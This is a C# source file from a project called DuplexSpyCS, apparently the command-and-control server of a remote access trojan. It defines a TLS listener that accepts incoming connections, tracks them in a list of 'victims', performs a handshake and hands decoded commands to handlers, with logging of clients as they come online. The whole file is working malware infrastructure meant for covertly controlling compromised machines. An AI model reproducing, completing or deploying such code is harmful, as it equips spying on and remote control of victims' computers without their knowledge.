using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace DuplexSpyCS
{
    public class clsTlsListener : clsListener
    {
        private X509Certificate m_certificate { get; set; }
        private TcpListener m_listener { get; set; }
        
        private List<clsVictim> m_lsVictim = new List<clsVictim>();
        public List<clsVictim> Victims { get { return m_lsVictim; } }

        public clsTlsListener(string szName, int nPort, string szDescription, string szCertPath, string szCertPassword)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_protocol = enListenerProtocol.TLS;

            m_certificate = new X509Certificate(szCertPath, szCertPassword);
            m_listener = new TcpListener(IPAddress.Any, nPort);

            m_bIslistening = false;
        }

        ~clsTlsListener() => fnStop();

        public override void fnStart()
        {
            if (m_bIslistening)
            {
                MessageBox.Show($"Listener[{m_szName} is already in used.", "fnStart()", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            Socket sktSrv = m_listener.Server;
            var hSafe = sktSrv.SafeHandle;
            if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
            {
                m_listener = null;
                m_listener = new TcpListener(IPAddress.Any, m_nPort);
            }

            m_listener.Start();
            m_listener.BeginAcceptTcpClient(new AsyncCallback(fnAcceptCallback), m_listener);
            m_bIslistening = true;
        }

        public override void fnStop()
        {
            foreach (var victim in m_lsVictim)
            {
                try
                {
                    if (victim.m_sslClnt != null)
                        victim.m_sslClnt.Close();

                    if (victim.socket != null && victim.socket.Connected)
                        victim.socket.Close();
                }
                catch (Exception ex)
                {
                    clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
                }
            }

            m_lsVictim.Clear();

            m_listener.Stop();
            m_bIslistening = false;

            clsStore.sql_conn.WriteSystemLogs($"Stop listening port: {m_nPort}");
        }

        private byte[] fnCombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
        {
            byte[] bytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(first_bytes, first_idx, first_len);
                ms.Write(second_bytes, second_idx, second_len);
                bytes = ms.ToArray();
            }

            return bytes;
        }

        private void fnAcceptCallback(IAsyncResult ar)
        {
            if (ar == null || ar.AsyncState == null)
                return;

            TcpListener listener = (TcpListener)ar.AsyncState;
            Socket sktSrv = listener.Server;

            try
            {
                var hSafe = sktSrv.SafeHandle;
                if (!m_bIslistening || sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                    return;

                listener.BeginAcceptTcpClient(new AsyncCallback(fnAcceptCallback), listener);

                TcpClient clnt = m_listener.EndAcceptTcpClient(ar);
                SslStream sslStream = new SslStream(clnt.GetStream(), false);
                sslStream.AuthenticateAsServer(m_certificate, false, false);

                clsVictim vicitm = new clsVictim(clnt.Client, sslStream, this);

                sslStream.BeginRead(vicitm.buffer, 0, vicitm.buffer.Length, new AsyncCallback(fnReadCallback), vicitm);
            }
            catch (Exception ex)
            {

            }
        }

        private void fnReadCallback(IAsyncResult ar)
        {
            if (ar?.AsyncState == null)
                return;

            clsVictim victim = (clsVictim)ar.AsyncState;

            const int CMD_TLS = 1;
            const int PARA_HELLO = 0;
            const int PARA_ACK = 1;

            try
            {
                SslStream sslClnt = victim.m_sslClnt;
                clsDSP dsp = null;

                int nRecv;
                byte[] abStaticRecvBuffer;
                byte[] abDynamicRecvBuffer = { };

                victim.fnSslSend(1, 0, clsEZData.fnGenerateRandomStr());

                do
                {
                    abStaticRecvBuffer = new byte[clsVictim.MAX_BUFFER_LENGTH];
                    nRecv = sslClnt.Read(abStaticRecvBuffer, 0, abStaticRecvBuffer.Length);

                    if (nRecv <= 0)
                        break;

                    clsStore.recv_bytes += nRecv;

                    abDynamicRecvBuffer = fnCombineBytes(
                        abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length,
                        abStaticRecvBuffer, 0, nRecv);

                    while (abDynamicRecvBuffer.Length >= clsDSP.HEADER_SIZE)
                    {
                        var header = clsDSP.GetHeader(abDynamicRecvBuffer);
                        if (abDynamicRecvBuffer.Length - clsDSP.HEADER_SIZE < header.len)
                            break;

                        dsp = new clsDSP(abDynamicRecvBuffer);
                        abDynamicRecvBuffer = dsp.MoreData;

                        int cmd = header.cmd;
                        int para = header.para;
                        byte[] msg = dsp.GetMsg().msg;

                        if (cmd == CMD_TLS && para == PARA_HELLO)
                        {
                            victim.fnSslSend(CMD_TLS, PARA_ACK, clsEZData.fnGenerateRandomStr());

                            m_lsVictim.Add(victim);

                            clsStore.sql_conn.WriteSystemLogs($"Client online: {victim.socket.RemoteEndPoint}");
                        }
                        else if (cmd == 2 && para == 0)
                        {
                            string szPlain = Encoding.UTF8.GetString(msg);
                            Task.Run(() => fnReceivedDecoded(this, victim, szPlain.Split('|').ToList()));
                        }
                    }
                }
                while (true);
            }
            catch (Exception ex)
            {
                clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
            }
            finally
            {
                m_lsVictim.Remove(victim);
                fnDisconnected(victim);
            }
        }
    }
}
